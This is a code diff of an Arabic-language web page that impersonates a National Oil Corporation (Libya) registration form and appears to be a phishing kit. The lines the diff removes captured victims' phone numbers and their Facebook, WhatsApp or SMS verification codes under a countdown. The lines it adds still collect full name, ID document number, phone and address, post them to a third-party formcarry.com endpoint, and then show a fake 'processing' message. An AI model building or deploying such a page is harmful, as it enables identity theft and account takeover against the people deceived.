@@ -96,31 +96,14 @@
       margin-top: 10px;
       color: #cc0000;
     }
-
-    #startSection, #phoneSection, #mainForm {
-      display: none;
-    }
   </style>
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="formContainer">
   <img src="https://upload.wikimedia.org/wikipedia/ar/3/3c/NOC_Libya_Logo.png" alt="شعار المؤسسة الوطنية للنفط" class="logo" />
   <h2>نموذج التسجيل - مؤسسة النفط الليبية</h2>
 
-  <!-- الزر الأول -->
-  <div id="startSection">
-    <button onclick="showPhoneInput()">ابدأ التسجيل</button>
-  </div>
-
-  <!-- إدخال رقم الهاتف -->
-  <div id="phoneSection">
-    <label>رقم الهاتف:</label>
-    <input type="text" id="phoneOnly" required />
-    <button onclick="submitPhone()">إرسال الرقم</button>
-  </div>
-
-  <!-- باقي النموذج -->
   <form id="mainForm">
     <label>الاسم الكامل:</label>
     <input type="text" id="fullName" name="fullName" required />
@@ -140,81 +123,21 @@
       <input type="text" id="docNumber" name="docNumber" required />
     </div>
 
-    <input type="hidden" id="phone" name="phone" />
+    <label>رقم الهاتف:</label>
+    <input type="text" id="phone" name="phone" required />
 
     <button type="submit">إرسال الطلب</button>
   </form>
 </div>
 
-<!-- نافذة الكود -->
-<div class="popup" id="codePopup">
-  <form id="codeForm">
-    <h3 style="color:#003366;">يرجى إدخال كود التوثيق من فيسبوك أو واتساب أو SMS</h3>
-    <label>كود التوثيق:</label>
-    <input type="text" id="code" name="code" required placeholder="أدخل الكود" />
-    <button type="submit">إرسال الكود</button>
-    <div class="countdown" id="countdown">08:00</div>
-  </form>
-</div>
-
-<!-- رسالة الاعتذار -->
+<!-- نافذة الاعتذار -->
 <div class="popup" id="errorPopup">
-  <h3 style="color: green;">جاري معالجة طلبك، الرجاء المحاولة لاحقًا.</h3>
-  <button onclick="location.reload()">إعادة التسجيل</button>
+  <h3 style="color: green;">جاري معالجة طلبك، الرجاء المراجعة في وقت آخر</h3>
+  <button onclick="resetForm()">إعادة التسجيل من جديد</button>
 </div>
 
 <script>
   const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";
-  let savedPhone = "";
-  let codeSubmitCount = 0;
-
-  window.onload = () => {
-    document.getElementById("startSection").style.display = "block";
-  };
-
-  function showPhoneInput() {
-    document.getElementById("startSection").style.display = "none";
-    document.getElementById("phoneSection").style.display = "block";
-  }
-
-  function submitPhone() {
-    const phoneInput = document.getElementById("phoneOnly").value.trim();
-    const phoneRegex = /^(091|092|094)\d{7}$/;
-
-    if (!phoneRegex.test(phoneInput)) {
-      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
-      return;
-    }
-
-    savedPhone = phoneInput;
-    document.getElementById("phone").value = savedPhone;
-    document.getElementById("codePopup").style.display = "block";
-    document.getElementById("phoneSection").style.display = "none";
-    startCountdown(8 * 60);
-  }
-
-  document.getElementById("codeForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-    const code = document.getElementById("code").value.trim();
-
-    if (!/^[A-Za-z0-9]{6,8}$/.test(code)) {
-      alert("الكود يجب أن يكون من 6 إلى 8 أرقام أو أحرف.");
-      return;
-    }
-
-    codeSubmitCount++;
-
-    fetch(formcarryURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, phone: savedPhone })
-    }).then(() => {
-      if (codeSubmitCount >= 1) {
-        document.getElementById("codePopup").style.display = "none";
-        document.getElementById("mainForm").style.display = "block";
-      }
-    }).catch(() => alert("فشل في إرسال الكود."));
-  });
 
   document.getElementById("docType").addEventListener("change", function () {
     const docContainer = document.getElementById("docNumberContainer");
@@ -234,39 +157,38 @@
 
   document.getElementById("mainForm").addEventListener("submit", function (e) {
     e.preventDefault();
+
     const fullName = document.getElementById("fullName").value.trim();
     const docType = document.getElementById("docType").value;
     const docNumber = document.getElementById("docNumber").value.trim();
+    const phone = document.getElementById("phone").value.trim();
     const address = document.getElementById("address").value.trim();
-    const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
 
+    const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
     if (!arabicRegex.test(fullName)) {
       alert("الاسم يجب أن يكون باللغة العربية ويحتوي على 8 أحرف أو أكثر.");
+      return;
+    }
+
+    const phoneRegex = /^(091|092|094)\d{7}$/;
+    if (!phoneRegex.test(phone)) {
+      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
       return;
     }
 
     fetch(formcarryURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ fullName, docType, docNumber, phone: savedPhone, address })
+      body: JSON.stringify({ fullName, docType, docNumber, phone, address })
     }).then(() => {
-      alert("تم إرسال البيانات بنجاح.");
-    }).catch(() => alert("حدث خطأ أثناء إرسال البيانات."));
+      // عند الإرسال بنجاح، نخفي النموذج ونظهر نافذة الاعتذار
+      document.getElementById("formContainer").style.display = "none";
+      document.getElementById("errorPopup").style.display = "block";
+    }).catch(() => alert("حدث خطأ أثناء الإرسال"));
   });
 
-  function startCountdown(duration) {
-    let timer = duration, minutes, seconds;
-    const countdown = document.getElementById("countdown");
-
-    const interval = setInterval(() => {
-      minutes = Math.floor(timer / 60);
-      seconds = timer % 60;
-      countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-      if (--timer < 0) {
-        clearInterval(interval);
-        countdown.textContent = "انتهى الوقت!";
-      }
-    }, 1000);
+  function resetForm() {
+    location.reload();
   }
 </script>
 
